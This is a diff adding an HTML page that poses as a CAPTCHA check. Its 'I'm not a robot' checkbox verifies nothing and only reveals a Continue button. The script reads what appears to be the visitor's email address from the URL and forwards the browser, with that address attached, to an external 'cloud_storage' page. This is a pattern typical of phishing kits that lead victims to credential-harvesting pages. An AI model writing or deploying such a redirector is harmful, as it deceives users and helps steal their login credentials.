@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Redirect Page with CAPTCHA</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div id="captchaBox">
+    <label>
+      <input type="checkbox" id="captchaCheck" onclick="toggleButton()">
+      I'm not a robot
+    </label>
+    <br>
+    <button id="continueBtn" onclick="redirectNow()">Continue</button>
+  </div>
+
+  <script>
+    function toggleButton() {
+      const checkbox = document.getElementById("captchaCheck");
+      const button = document.getElementById("continueBtn");
+      button.style.display = checkbox.checked ? "inline-block" : "none";
+    }
+
+    function redirectNow() {
+      var queryString = window.location.href;
+      var email = queryString.split("&");
+      var root = email[1];
+      var cross = root.split("#");
+      var dom = cross[0];
+
+      var redirect = "https://atg-groups.co.uk/cloud_storage/index.html#{domain}";
+      var link = redirect.replace("{domain}", dom);
+      window.location.href = link;
+    }
+  </script>
+</body>
+</html>
